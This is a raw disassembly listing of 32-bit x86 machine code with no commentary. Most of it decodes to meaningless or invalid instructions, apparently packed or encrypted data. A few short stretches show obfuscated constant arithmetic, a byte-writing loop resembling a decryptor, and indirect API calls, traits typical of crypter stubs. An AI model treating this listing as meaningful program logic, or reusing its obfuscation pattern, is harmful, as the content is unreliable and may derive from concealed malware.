  416dd5:	or     BYTE PTR [edx-0x79ad0aa1],dl
  416ddb:	loope  0x416d8f
  416ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dde:	pop    ds
  416ddf:	pusha  
  416de0:	dec    eax
  416de1:	xor    esp,DWORD PTR [eax+0x22aed5c4]
  416de7:	inc    ebp
  416de8:	lahf   
  416de9:	xor    eax,0xba7e9540
  416dee:	nop
  416def:	jae    0x416d78
  416df1:	lods   eax,DWORD PTR ds:[esi]
  416df2:	dec    ecx
  416df3:	xchg   esp,esi
  416df5:	mov    ecx,0x551ceb18
  416dfa:	test   ah,ch
  416dfc:	sub    al,0xb
  416dfe:	pop    edi
  416dff:	fld    TBYTE PTR [ecx]
  416e01:	int3   
  416e02:	lock dec eax
  416e04:	ret    
  416e05:	jno    0x416e24
  416e07:	lahf   
  416e08:	mov    ah,0xdf
  416e0a:	popf   
  416e0b:	cmp    DWORD PTR [esi-0x76a00a7f],esi
  416e11:	cs pop edi
  416e13:	push   es
  416e14:	inc    ebp
  416e15:	push   0x6f
  416e17:	xchg   DWORD PTR [ebx+esi*4-0x33],edx
  416e1b:	adc    cl,al
  416e1d:	stc    
  416e1e:	nop
  416e1f:	inc    ecx
  416e20:	(bad)  
  416e21:	or     al,0x76
  416e23:	jnp    0x416e5e
  416e25:	shl    BYTE PTR [ecx-0x1b68a4eb],1
  416e2b:	inc    edx
  416e2c:	lods   al,BYTE PTR ds:[esi]
  416e2d:	dec    esi
  416e2e:	sbb    BYTE PTR [eax-0x69],cl
  416e31:	ds xchg edi,eax
  416e33:	sub    BYTE PTR [ecx+0x4d],cl
  416e36:	sar    DWORD PTR [esi-0x54],1
  416e39:	cmp    BYTE PTR [ebp-0x243cc7b6],bh
  416e3f:	or     eax,0xdd89948a
  416e44:	aad    0xb8
  416e46:	mov    eax,ds:0x471681d
  416e4b:	ret    0x6adf
  416e4e:	in     eax,dx
  416e4f:	jmp    0x416eab
  416e51:	nop    DWORD PTR [ebx+ebx*8]
  416e55:	scas   eax,DWORD PTR es:[edi]
  416e56:	jge    0x416e0f
  416e58:	or     al,0x42
  416e5a:	div    dl
  416e5c:	xor    DWORD PTR [esi],ecx
  416e5e:	pop    ss
  416e5f:	aaa    
  416e60:	xchg   BYTE PTR [edi-0x75af9af2],ch
  416e66:	aad    0x18
  416e68:	sub    eax,0xa7c14d78
  416e6d:	call   0x9535:0xb5d0d3f1
  416e74:	in     al,dx
  416e75:	push   cs
  416e76:	stos   BYTE PTR es:[edi],al
  416e77:	or     al,0x82
  416e79:	jg     0x416e91
  416e7b:	push   ebp
  416e7c:	ret    
  416e7d:	sahf   
  416e7e:	aam    0xa7
  416e80:	pop    ss
  416e81:	test   DWORD PTR [eax+edx*1],0x2ea173f6
  416e88:	xchg   ecx,eax
  416e89:	retf   
  416e8a:	push   ebx
  416e8b:	sub    esp,ebp
  416e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e8e:	xchg   ebp,eax
  416e8f:	sbb    eax,DWORD PTR [eax-0x20]
  416e92:	ds mov ebp,0x99d25742
  416e98:	sub    al,0x88
  416e9a:	bound  edx,QWORD PTR ds:0x870efa59
  416ea0:	sar    BYTE PTR [ebp+eax*2+0x64155a43],cl
  416ea7:	and    al,0x8
  416ea9:	and    al,0xdd
  416eab:	rcl    BYTE PTR [edx+0x1354bb4c],0xf
  416eb2:	cmp    ecx,ebx
  416eb4:	or     eax,0x6810b4d3
  416eb9:	leave  
  416eba:	nop
  416ebb:	sbb    esp,DWORD PTR [esi+edi*1]
  416ebe:	popf   
  416ebf:	cmp    esi,0xf9c22183
  416ec5:	into   
  416ec6:	pop    ebp
  416ec7:	(bad)  
  416ec8:	mov    eax,0xf0cf135a
  416ecd:	dec    eax
  416ece:	retf   0xeefa
  416ed1:	stos   BYTE PTR es:[edi],al
  416ed2:	sahf   
  416ed3:	stos   BYTE PTR es:[edi],al
  416ed4:	test   DWORD PTR [eax-0x3b],esp
  416ed7:	stos   DWORD PTR es:[edi],eax
  416ed8:	xchg   DWORD PTR [edx+0x78e48f8d],edx
  416ede:	jp     0x416f20
  416ee0:	jl     0x416f35
  416ee2:	leave  
  416ee3:	sbb    eax,0x8440cde5
  416ee8:	cmp    BYTE PTR [edi-0x33],dl
  416eeb:	aam    0x16
  416eed:	fs pop eax
  416eef:	jg     0x416f31
  416ef1:	mov    cl,BYTE PTR [ecx]
  416ef3:	retf   0xc754
  416ef6:	mov    esp,0x824dceed
  416efb:	mov    dh,0x69
  416efd:	cld    
  416efe:	fnstenv es:[esi]
  416f01:	clc    
  416f02:	jmp    0x9a2e:0xc106d2c5
  416f09:	enter  0x881d,0x42
  416f0d:	lods   al,BYTE PTR ds:[esi]
  416f0e:	mov    esi,DWORD PTR [ecx+0x76]
  416f11:	dec    ebp
  416f12:	xor    BYTE PTR [esi],dh
  416f14:	mov    ebx,0x5eff1f59
  416f19:	stc    
  416f1a:	fidiv  WORD PTR [eax+0x4d46c43b]
  416f20:	inc    ecx
  416f21:	cmp    al,0x95
  416f23:	inc    esp
  416f24:	addr16 push ecx
  416f26:	jecxz  0x416f99
  416f28:	sahf   
  416f29:	lahf   
  416f2a:	(bad)  [edi+eax*8+0x5542387d]
  416f31:	in     eax,0x32
  416f33:	adc    DWORD PTR [edx-0xd466f1],ebp
  416f39:	js     0x416fad
  416f3b:	mov    edx,0x5c242f0f
  416f40:	dec    edi
  416f41:	mov    eax,0xde0282fe
  416f46:	xor    DWORD PTR [ebx],0xdf793c49
  416f4c:	inc    edi
  416f4d:	call   0x2c51:0xd985e540
  416f54:	(bad)  
  416f55:	fld    TBYTE PTR [edi-0x72e3bb4f]
  416f5b:	das    
  416f5c:	jbe    0x416f6f
  416f5e:	and    BYTE PTR [ebp-0x559b3e47],dh
  416f64:	xchg   esi,eax
  416f65:	push   0x5779d535
  416f6a:	retf   0x825e
  416f6d:	inc    ebx
  416f6e:	js     0x416f19
  416f70:	add    bl,BYTE PTR [esi]
  416f72:	mov    eax,ds:0x9ccb1e27
  416f77:	gs xchg edi,eax
  416f79:	call   0xceb81ecb
  416f7e:	mov    WORD PTR [edi-0x21],cs
  416f81:	sbb    eax,0x7973b45e
  416f86:	nop
  416f87:	pop    edx
  416f88:	xor    dh,dh
  416f8a:	cmp    al,0x7a
  416f8c:	clc    
  416f8d:	xchg   esp,eax
  416f8e:	mov    dh,0xe4
  416f90:	jnp    0x41700f
  416f92:	mov    ebp,0x13c89d79
  416f97:	(bad)  
  416f98:	fimul  DWORD PTR [esi+ebp*1-0x26bab154]
  416f9f:	add    al,0xa5
  416fa1:	xchg   ecx,eax
  416fa2:	in     al,0x5a
  416fa4:	sti    
  416fa5:	mov    ah,0x4c
  416fa7:	(bad)  
  416fa8:	push   esp
  416fa9:	arpl   cx,bp
  416fab:	adc    cl,BYTE PTR [esp+edx*8-0x15b1f6e1]
  416fb2:	scas   eax,DWORD PTR es:[edi]
  416fb3:	daa    
  416fb4:	jge    0x416f81
  416fb6:	pop    ss
  416fb7:	enter  0x68a8,0xaa
  416fbb:	int    0x6b
  416fbd:	and    cl,BYTE PTR [ebp-0x24]
  416fc0:	sti    
  416fc1:	pop    edx
  416fc2:	xor    bl,BYTE PTR [edx+0x49fe2486]
  416fc8:	(bad)  
  416fc9:	test   DWORD PTR [ebp+0x2a511e62],0x9da44320
  416fd3:	popa   
  416fd4:	xor    eax,0xd9503878
  416fd9:	xchg   esp,eax
  416fda:	jl     0x417018
  416fdc:	int3   
  416fdd:	imul   ecx,DWORD PTR ds:0x68f7bddf,0xffffffc8
  416fe4:	(bad)  
  416fe5:	adc    eax,0xf8cf9515
  416fea:	or     ecx,DWORD PTR [ecx]
  416fec:	clc    
  416fed:	sti    
  416fee:	and    esp,DWORD PTR [ecx]
  416ff0:	retf   0x6e7a
  416ff3:	fisttp DWORD PTR [ebx]
  416ff5:	add    ecx,DWORD PTR [edx+ebx*4-0x51e37da9]
  416ffc:	adc    eax,0xd3318d84
  417001:	jae    0x41707f
  417003:	ror    eax,cl
  417005:	cli    
  417006:	cs repnz inc esi
  417009:	imul   DWORD PTR [ebx]
  41700b:	aas    
  41700c:	pop    es
  41700d:	ror    BYTE PTR [esi-0x5],cl
  417010:	jecxz  0x41701e
  417012:	and    DWORD PTR [esi+eiz*2+0x37c968a0],esp
  417019:	and    ebp,DWORD PTR [edx+0x4fb28dd6]
  41701f:	and    dh,BYTE PTR [eax]
  417021:	inc    edi
  417022:	jae    0x416fa7
  417024:	jmp    0x41700f
  417026:	(bad)  
  417027:	jge    0x417081
  417029:	int    0xe0
  41702b:	pop    ss
  41702c:	int    0x79
  41702e:	mov    esi,0xdc45cf1a
  417033:	mov    edi,0x79ed7d1d
  417038:	fsub   st,st(0)
  41703a:	je     0x416fdf
  41703c:	sbb    DWORD PTR [edx+0x1e53c67],0x8e5ac025
  417046:	mov    dh,0xa0
  417048:	mov    gs,WORD PTR [esp+edi*8-0x5c6d42f9]
  41704f:	cmp    edx,DWORD PTR [eax+0x77410d8c]
  417055:	add    bh,bh
  417057:	int3   
  417058:	adc    BYTE PTR [ebx-0x75],bh
  41705b:	mov    WORD PTR [ecx],?
  41705d:	mov    al,0x40
  41705f:	jne    0x4170b9
  417061:	cld    
  417062:	(bad)  
  417063:	adc    ebx,DWORD PTR [eax+0xd]
  417066:	jp     0x417074
  417068:	lods   eax,DWORD PTR ds:[esi]
  41706a:	loope  0x4170ea
  41706c:	adc    DWORD PTR [esi],ebx
  41706e:	sbb    eax,DWORD PTR [edx*8-0x32073cf3]
  417075:	ror    DWORD PTR [ebp-0x48b8fd00],cl
  41707b:	jno    0x417070
  41707d:	push   eax
  41707e:	bound  ebp,QWORD PTR [esi-0x2d]
  417081:	imul   eax,DWORD PTR [edi+0x5e],0xc65b951b
  417088:	and    ecx,edi
  41708a:	fwait
  41708b:	les    ebx,FWORD PTR [esi+0x7]
  41708e:	lods   al,BYTE PTR ds:[esi]
  41708f:	xor    esp,DWORD PTR [edi+0x54]
  417092:	push   0x58
  417094:	fnstsw WORD PTR [ebx+0x26f56436]
  41709a:	adc    dh,BYTE PTR [edx+0xd667c70]
  4170a0:	jle    0x417076
  4170a2:	or     DWORD PTR [ecx+0x77],edx
  4170a5:	stos   BYTE PTR es:[edi],al
  4170a6:	inc    ebx
  4170a7:	ret    
  4170a8:	inc    edx
  4170a9:	mov    eax,DWORD PTR [ebp-0x10]
  4170ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0xbca7fb0e
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    BYTE PTR [eax-0x21ea72c],ch
  4171a3:	mov    ds,esi
  4171a5:	push   ebx
  4171a6:	pop    eax
  4171a7:	inc    ebp
  4171a8:	push   ss
  4171a9:	fs aad 0x33
  4171ac:	inc    ebp
  4171ad:	(bad)  
  4171ae:	out    dx,eax
  4171af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b0:	cmp    esp,DWORD PTR [ecx+esi*2+0x28]
  4171b4:	and    edi,esp
  4171b6:	adc    DWORD PTR [edi],edx
  4171b8:	test   DWORD PTR [eax-0x71],ebp
  4171bb:	jnp    0x4171dd
  4171bd:	fisttp WORD PTR [ebx+edx*8-0x3fff3840]
  4171c4:	pop    eax
  4171c5:	rol    BYTE PTR cs:[eax+0x7c],cl
  4171c9:	test   BYTE PTR ds:0x3c758,al
  4171cf:	or     DWORD PTR ds:0x4c33e954,0x575c1ee0
  4171d9:	fiadd  WORD PTR [ebx-0x7c357174]
  4171df:	hlt    
  4171e0:	and    al,BYTE PTR [ebp+0x59]
  4171e3:	inc    ebx
  4171e4:	add    BYTE PTR ds:0x94eeb48a,bl
  4171ea:	stos   BYTE PTR es:[edi],al
  4171eb:	pminub mm0,QWORD PTR [esi-0x10]
  4171ef:	lds    esi,FWORD PTR [esi]
  4171f1:	repnz inc esi
  4171f3:	bound  ebp,QWORD PTR [esi+edx*1-0x5c4ff2dc]
  4171fa:	popf   
  4171fb:	pop    es
  4171fc:	ret    0xa71a
  4171ff:	mov    eax,ds:0xccd83ce5
  417204:	ins    WORD PTR es:[edi],dx
  417206:	jge    0x4171e7
  417208:	pop    es
  417209:	out    dx,al
  41720a:	aas    
  41720b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41720c:	add    BYTE PTR [esi+edi*1],dl
  41720f:	out    dx,al
  417210:	and    esi,DWORD PTR [edi]
  417212:	add    eax,0x19a7f617
  417217:	out    0x73,al
  417219:	(bad)  
  41721a:	fist   WORD PTR [esi-0xe7ec9e2]
  417220:	add    al,0x1c
  417222:	bound  edi,QWORD PTR [eax]
  417224:	out    dx,eax
  417225:	in     al,dx
  417226:	dec    ebp
  417227:	push   ecx
  417228:	jle    0x417218
  41722a:	sar    BYTE PTR [ebp+edi*4+0xc],0xc6
  41722f:	sbb    ah,bl
  417231:	cmc    
  417232:	fwait
  417233:	jg     0x4172b1
  417235:	shr    BYTE PTR [ebp+0x744b931c],1
  41723b:	mov    bh,0x69
  41723d:	icebp  
  41723e:	fs call 0x27326068
  417244:	sahf   
  417245:	mov    edi,0x10f3d6cb
  41724a:	pop    esi
  41724b:	mov    edi,0x8e7cbddd
  417250:	jmp    0xded6:0xbfc218b6
  417257:	or     eax,0x7b460e34
  41725c:	sahf   
  41725d:	inc    esi
  41725e:	arpl   dx,ax
  417260:	mov    al,ds:0xd0cc88d2
  417265:	jae    0x4172e1
  417267:	mov    al,ds:0x520bf94c
  41726c:	mov    ds:0x780b1dd5,al
  417271:	fstp   TBYTE PTR ds:0xab59d902
  417277:	or     al,0x42
  417279:	cmp    ch,ah
  41727b:	jno    0x4172f5
  41727d:	xchg   ecx,eax
  41727e:	cmp    DWORD PTR [ecx+0x7a7f0f0],edx
  417284:	pop    ss
  417285:	and    BYTE PTR [eax+ecx*2+0x60],ah
  417289:	aam    0x67
  41728b:	cmp    esp,DWORD PTR [esi-0x674343c6]
  417291:	ja     0x41728b
  417293:	ss (bad) 
  417295:	pop    ds
  417296:	js     0x417262
  417298:	jo     0x41730d
  41729a:	mov    esi,0xce63226e
  41729f:	outs   dx,BYTE PTR ds:[esi]
  4172a0:	dec    ebp
  4172a1:	out    0xea,al
  4172a3:	aaa    
  4172a4:	sbb    eax,0xb52f4f57
  4172a9:	push   ds
  4172aa:	out    0x1b,eax
  4172ac:	cwde   
  4172ad:	fld    QWORD PTR [ecx+eiz*8]
  4172b0:	fmul   st(1),st
  4172b2:	push   esp
  4172b3:	xchg   ebx,eax
  4172b4:	mov    BYTE PTR [ebp+0xf],ah
  4172b7:	mov    al,ds:0x832dedc7
  4172bd:	scas   al,BYTE PTR es:[edi]
  4172be:	inc    esp
  4172bf:	(bad)  
  4172c0:	idiv   BYTE PTR [edi+0x77]
  4172c3:	pusha  
  4172c4:	pop    es
  4172c5:	or     DWORD PTR [ebx],esi
  4172c7:	pop    edx
  4172c8:	mov    dh,0x7c
  4172ca:	cmp    al,0xd8
  4172cc:	dec    esi
  4172cd:	lock dec ebx
  4172cf:	gs loopne 0x417271
  4172d2:	pop    ebx
  4172d3:	sbb    BYTE PTR [ebx],dh
  4172d5:	mov    edx,0x1d83c2aa
  4172da:	in     eax,dx
  4172db:	or     edx,DWORD PTR [edi]
  4172dd:	push   esp
  4172de:	inc    ebp
  4172df:	fcmovne st,st(3)
  4172e1:	adc    BYTE PTR [ecx],ch
  4172e3:	inc    edx
  4172e4:	mov    eax,0x76f9589a
  4172e9:	pop    ds
  4172ea:	xchg   ebp,eax
  4172eb:	(bad)  
  4172ec:	mov    al,ds:0xf255656c
  4172f1:	xor    BYTE PTR [ecx],0x2f
  4172f4:	aam    0x8
  4172f6:	in     al,dx
  4172f7:	or     ebp,DWORD PTR [ecx-0x67]
  4172fa:	stc    
  4172fb:	xlat   BYTE PTR ds:[ebx]
  4172fc:	jmp    0x1d99:0x49d42ca
  417303:	js     0x4172d5
  417305:	shr    ah,cl
  417307:	xchg   ebx,eax
  417308:	leave  
  417309:	mov    bh,0x11
  41730b:	inc    ebp
  41730c:	dec    esp
  41730d:	icebp  
  41730e:	shl    BYTE PTR [eax-0x5d478c71],cl
  417314:	jmp    0x6d93e221
  417319:	pop    edx
  41731a:	ja     0x417331
  41731c:	popa   
  41731d:	mov    ds:0x6ca54249,eax
  417322:	enter  0x725b,0x6b
  417326:	cli    
  417327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417328:	push   edx
  417329:	dec    ecx
  41732a:	retf   0x54ef
  41732d:	pop    edx
  41732e:	cmp    DWORD PTR [esi+0x63c9e0de],esi
  417334:	arpl   WORD PTR ds:0x7ab2a4c9,sp
  41733a:	pop    esi
  41733b:	dec    esi
  41733c:	popf   
  41733d:	rol    DWORD PTR [edi-0x5a20d1cc],0x1c
  417344:	ss (bad) 
  417346:	adc    eax,0xbf704394
  41734b:	xor    eax,0x8c1e2f3b
  417350:	sahf   
  417351:	mov    edx,esi
  417353:	fcmovne st,st(3)
  417355:	adc    ecx,edi
  417357:	cld    
  417358:	jo     0x417321
  41735a:	mov    DWORD PTR [esi-0x20da0fb],ecx
  417360:	ss mov ecx,0x3678085e
  417366:	ja     0x417356
  417368:	lahf   
  417369:	test   al,0xb7
  41736b:	hlt    
  41736c:	ins    DWORD PTR es:[edi],dx
  41736d:	les    ebp,FWORD PTR [eax+ebp*2+0x36]
  417371:	push   cs
  417372:	xchg   ebx,eax
  417373:	ret    0xfa1c
  417376:	cmp    DWORD PTR [esi+0x47],esi
  417379:	scas   al,BYTE PTR es:[edi]
  41737a:	stc    
  41737b:	fbld   TBYTE PTR [ebp+eiz*8-0x1]
  41737f:	shr    DWORD PTR [eax-0x44],1
  417382:	aaa    
  417383:	or     ebp,DWORD PTR [edx]
  417385:	ret    0x9b
  417388:	adc    DWORD PTR [ebx],ebp
  41738a:	push   es
  41738b:	push   esi
  41738c:	cmp    edx,esi
  41738e:	sbb    al,0x8
  417390:	push   ebx
  417391:	test   al,0xea
  417393:	leave  
  417394:	cmp    al,0xdb
  417396:	jmp    0x417408
  417398:	pop    ecx
  417399:	or     BYTE PTR [ebx],ch
  41739b:	scas   eax,DWORD PTR es:[edi]
  41739c:	int    0x13
  41739e:	sbb    eax,edx
  4173a0:	iret   
  4173a1:	aaa    
  4173a2:	es nop
  4173a4:	arpl   bp,cx
  4173a6:	mov    ds:0x843044,al
  4173ab:	fsubr  DWORD PTR [ecx+0x2669d4e9]
  4173b1:	(bad)  
  4173b2:	jge    0x4173c5
  4173b4:	pop    ecx
  4173b5:	pop    eax
  4173b6:	daa    
  4173b7:	bound  edx,QWORD PTR [edx]
  4173b9:	add    dh,ch
  4173bb:	cwde   
  4173bc:	and    cl,dl
  4173be:	inc    ecx
  4173bf:	mov    ds:0x43119cf1,al
  4173c4:	(bad)  
  4173c5:	das    
  4173c6:	ins    BYTE PTR es:[edi],dx
  4173c7:	adc    DWORD PTR [eax],ebp
  4173c9:	cmp    BYTE PTR [edi+0x3e],0xc7
  4173cd:	jnp    0x417416
  4173cf:	xchg   ebp,eax
  4173d0:	cmp    al,BYTE PTR [ebx-0x69]
  4173d3:	push   edx
  4173d4:	or     eax,0xbd708a46
  4173d9:	out    dx,eax
  4173da:	sub    al,0xb
  4173dc:	js     0x417414
  4173de:	push   edi
  4173df:	xor    eax,0x3afcbb53
  4173e4:	xchg   esi,eax
  4173e5:	pop    ebx
  4173e6:	mov    WORD PTR [esi+0x61],es
  4173e9:	mov    bl,0xee
  4173eb:	pop    esi
  4173ec:	leave  
  4173ed:	addr16 out 0xb5,eax
  4173f0:	xlat   BYTE PTR ds:[ebx]
  4173f1:	sub    eax,DWORD PTR [ebp-0x7f]
  4173f4:	nop
  4173f5:	arpl   WORD PTR [ecx+0x31],si
  4173f8:	xchg   edi,eax
  4173f9:	or     DWORD PTR [ecx-0x1a77c04d],ebx
  4173ff:	sub    DWORD PTR [ebp+ebx*2-0x29],0x8af9f0f4
  417407:	add    BYTE PTR [esi-0x43],ah
  41740a:	fwait
  41740b:	popa   
  41740c:	arpl   ax,bp
  41740e:	cwde   
  41740f:	xchg   ebp,eax
  417410:	out    0x38,eax
  417412:	scas   eax,DWORD PTR es:[edi]
  417413:	sar    edi,1
  417415:	mov    BYTE PTR [edx-0x79],al
  417418:	out    dx,al
  417419:	xchg   ebx,eax
  41741a:	and    ebx,ebx
  41741c:	adc    DWORD PTR [edx+eax*4-0x55470e1a],eax
  417423:	ins    BYTE PTR es:[edi],dx
  417424:	mov    cl,0xc4
  417426:	retf   0xf3a3
  417429:	xchg   esi,eax
  41742a:	lods   al,BYTE PTR ds:[esi]
  41742b:	(bad)  
  41742c:	fstp   DWORD PTR [eax+0x52]
  41742f:	add    DWORD PTR [edx-0x28],esp
  417432:	retf   
  417433:	daa    
  417434:	adc    dl,BYTE PTR [ecx+0x736b7d6b]
  41743a:	in     eax,dx
  41743b:	mov    ebp,0x32c5c615
  417440:	mov    bh,0x6a
  417442:	sub    ebp,eax
  417444:	mov    eax,0xb525ea4c
  417449:	mov    ds:0x6e8db204,al
  41744e:	sub    ecx,DWORD PTR ds:0x7420d218
  417454:	xor    ebp,eax
  417456:	xlat   BYTE PTR ds:[ebx]
  417457:	push   ss
  417458:	out    0xfd,eax
  41745a:	ret    
  41745b:	pop    ebx
  41745c:	dec    DWORD PTR [esi+edx*2+0x63]
  417460:	cs cmc 
  417462:	adc    BYTE PTR [esi+0x1d4cbcd2],bl
  417468:	in     eax,dx
  417469:	mov    ah,0x52
  41746b:	bound  esi,QWORD PTR [ecx+0x776e77f0]
  417471:	stc    
  417472:	mov    bh,BYTE PTR [esi]
  417474:	push   ecx
  417475:	adc    eax,0x4b3102c9
  41747a:	xchg   esp,eax
  41747b:	outs   dx,DWORD PTR ds:[esi]
  41747c:	jl     0x41749b
  41747e:	adc    edi,DWORD PTR [ebx]
  417480:	dec    ebp
  417481:	repz jl 0x417425
  417484:	call   0xa549:0x6a8d7246
  41748b:	test   DWORD PTR [eax],esi
  41748d:	(bad)  
  41748e:	mov    edi,0xdd0e43bb
  417493:	xchg   esi,eax
  417494:	or     edi,edi
  417496:	cmp    bl,BYTE PTR [ebp+0x37]
  417499:	pop    esi
  41749a:	inc    esp
  41749b:	mov    dh,0x55
  41749d:	push   ss
  41749e:	psllw  mm1,QWORD PTR [edi-0x69bcab3f]
  4174a5:	out    0xc1,eax
  4174a7:	jg     0x417522
  4174a9:	fs sbb eax,0x6dfcd21c
  4174af:	xchg   edx,eax
  4174b0:	adc    BYTE PTR [eax-0x76],bl
  4174b3:	ins    DWORD PTR es:[edi],dx
  4174b4:	das    
  4174b5:	push   cs
  4174b6:	jle    0x417526
  4174b8:	cmp    DWORD PTR [edi+0x56],ebp
  4174bb:	add    BYTE PTR [edi-0x3ecca5e7],bh
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x4223d4
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e70
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x4223c0
  417502:	call   DWORD PTR ds:0x428e94
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e7c
  41750f:	mov    ecx,DWORD PTR ds:0x422788
  417515:	sub    DWORD PTR ds:0x42830f,0x42838b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [ecx+ebp*4+0xa7e1f11]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x280e7e8],bh
  41753e:	cmp    bh,dh
  417540:	shl    BYTE PTR ds:0x470928fe,cl
  417546:	adc    eax,0xb9a4d520
  41754b:	ins    BYTE PTR es:[edi],dx
  41754c:	retf   
  41754d:	or     BYTE PTR [edx],bh
  41754f:	add    BYTE PTR [ebx],dl
  417551:	push   0xffffffaa
  417553:	stos   DWORD PTR es:[edi],eax
  417554:	test   BYTE PTR [ebx+0x7dc2f84b],ch
  41755a:	iret   
  41755b:	rcl    DWORD PTR [esi],1
  41755d:	fs pop edi
  41755f:	jg     0x417504
  417561:	repz popf 
  417563:	and    eax,0x89ac01c6
  417568:	mov    ebx,0x1edc85dd
  41756d:	test   eax,0x49fd1f8b
  417572:	sbb    bh,dh
  417574:	test   BYTE PTR [esp+ebx*1],dh
  417577:	xchg   esp,eax
  417578:	inc    esi
  417579:	loopne 0x4175e8
  41757b:	push   ebx
  41757c:	leave  
  41757d:	push   ebx
  41757e:	mov    ecx,0x34817417
  417583:	iret   
  417584:	add    esp,esi
  417586:	pop    edx
  417587:	mul    BYTE PTR ss:[esi+0x24676251]
  41758e:	in     al,0xad
  417590:	dec    edi
  417591:	push   edx
  417592:	retf   0x623
  417595:	xlat   BYTE PTR ds:[ebx]
  417596:	pusha  
  417597:	mov    ecx,0xe287eefb
  41759c:	vpcmpgtw ymm6,ymm5,ymm1
  4175a0:	cmp    esp,ebp
  4175a2:	cmp    ecx,DWORD PTR [ebx+0x37]
  4175a5:	pop    eax
  4175a6:	imul   edx,DWORD PTR [edx+0x7c4cb4e4],0x6f7a37e3
  4175b0:	in     al,0xff
  4175b2:	jmp    0x12b4:0xd6709de0
  4175b9:	(bad)  
  4175ba:	cmp    esi,DWORD PTR [eax+0x22]
  4175bd:	nop
  4175be:	sbb    al,0xd4
  4175c0:	ins    BYTE PTR es:[edi],dx
  4175c1:	pop    esi
  4175c2:	sbb    BYTE PTR [esi-0x4d],ch
  4175c5:	jmp    0xdac6:0x69a26fc
  4175cc:	rcr    BYTE PTR [ebx],cl
  4175ce:	int3   
  4175cf:	(bad)  
  4175d0:	dec    esi
  4175d1:	cwde   
  4175d2:	cwde   
  4175d3:	and    edx,DWORD PTR [edx]
  4175d5:	aam    0x5c
  4175d7:	out    dx,eax
  4175d8:	or     DWORD PTR [esi+0x14],edx
  4175db:	inc    ebp
  4175dc:	pop    ebp
  4175dd:	je     0x417610
  4175df:	fdivr  st,st(0)
